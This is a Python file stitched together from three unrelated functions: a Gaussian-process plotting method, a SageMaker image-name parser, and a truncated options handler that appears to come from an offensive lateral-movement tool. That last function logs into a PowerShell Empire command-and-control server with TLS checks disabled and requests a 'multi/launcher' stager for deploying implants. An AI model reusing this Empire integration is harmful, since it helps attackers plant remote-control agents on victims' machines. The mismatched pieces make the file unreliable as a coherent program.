def plot(self, X=None, n=0, ax=None, envelopes=[1, 3], base_alpha=0.375, return_prediction=False, return_std=True, full_output=False, plot_kwargs={}, **kwargs):
    if self.num_dim > 2:
        raise ValueError('Plotting is not supported for num_dim > 2!')
    if self.num_dim == 1:
        if X is None:
            X = scipy.linspace(self.X.min(), self.X.max(), 100)
    elif self.num_dim == 2:
        if X is None:
            x1 = scipy.linspace(self.X[:, 0].min(), self.X[:, 0].max(), 50)
            x2 = scipy.linspace(self.X[:, 1].min(), self.X[:, 1].max(), 50)
            (X1, X2) = scipy.meshgrid(x1, x2)
            X1 = X1.flatten()
            X2 = X2.flatten()
            X = scipy.hstack((scipy.atleast_2d(X1).T, scipy.atleast_2d(X2).T))
        else:
            X1 = scipy.asarray(X[:, 0]).flatten()
            X2 = scipy.asarray(X[:, 1]).flatten()
    if envelopes or (return_prediction and (return_std or full_output)):
        out = self.predict(X, n=n, full_output=True, **kwargs)
        mean = out['mean']
        std = out['std']
    else:
        mean = self.predict(X, n=n, return_std=False, **kwargs)
        std = None
    if self.num_dim == 1:
        univariate_envelope_plot(X, mean, std, ax=ax, base_alpha=base_alpha, envelopes=envelopes, **plot_kwargs)
    elif self.num_dim == 2:
        if ax is None:
            f = plt.figure()
            ax = f.add_subplot(111, projection='3d')
        elif ax == 'gca':
            ax = plt.gca()
        if 'linewidths' not in kwargs:
            kwargs['linewidths'] = 0
        s = ax.plot_trisurf(X1, X2, mean, **plot_kwargs)
        for i in envelopes:
            kwargs.pop('alpha', base_alpha)
            ax.plot_trisurf(X1, X2, mean - std, alpha=base_alpha / i, **kwargs)
            ax.plot_trisurf(X1, X2, mean + std, alpha=base_alpha / i, **kwargs)
    if return_prediction:
        if full_output:
            return (ax, out)
        elif return_std:
            return (ax, out['mean'], out['std'])
        else:
            return (ax, out['mean'])
    else:
        return ax

def framework_name_from_image(image_name):
    sagemaker_pattern = re.compile(ECR_URI_PATTERN)
    sagemaker_match = sagemaker_pattern.match(image_name)
    if sagemaker_match is None:
        return (None, None, None, None)
    else:
        name_pattern = re.compile('^sagemaker(?:-rl)?-(tensorflow|mxnet|chainer|pytorch|scikit-learn)(?:-)?(scriptmode)?:(.*)-(.*?)-(py2|py3)$')
        legacy_name_pattern = re.compile('^sagemaker-(tensorflow|mxnet)-(py2|py3)-(cpu|gpu):(.*)$')
        name_match = name_pattern.match(sagemaker_match.group(9))
        legacy_match = legacy_name_pattern.match(sagemaker_match.group(9))
        if name_match is not None:
            (fw, scriptmode, ver, device, py) = (name_match.group(1), name_match.group(2), name_match.group(3), name_match.group(4), name_match.group(5))
            return (fw, py, '{}-{}-{}'.format(ver, device, py), scriptmode)
        elif legacy_match is not None:
            return (legacy_match.group(1), legacy_match.group(2), legacy_match.group(4), None)
        else:
            return (None, None, None, None)

def options(self, context, module_options):
    if not 'LISTENER' in module_options:
        context.log.error('LISTENER option is required!')
        sys.exit(1)
    self.empire_launcher = None
    headers = {'Content-Type': 'application/json'}
    base_url = 'https://{}:{}'.format(context.conf.get('Empire', 'api_host'), context.conf.get('Empire', 'api_port'))
    try:
        payload = {'username': context.conf.get('Empire', 'username'), 'password': context.conf.get('Empire', 'password')}
        r = requests.post(base_url + '/api/admin/login', json=payload, headers=headers, verify=False)
        if r.status_code == 200:
            token = r.json()['token']
        else:
            context.log.error("Error authenticating to Empire's RESTful API server!")
            sys.exit(1)
        payload = {'StagerName': 'multi/launcher', 'Listener': module_options['LISTENER']}
        r = requests.post(base_url + '/api/stagers?token={}'.format(token), json=payload, headers=headers, verify=False)
        response = r.json()
        if 'error' in response:
            context.log.error('Error from empire : {}'.format(response['error']))
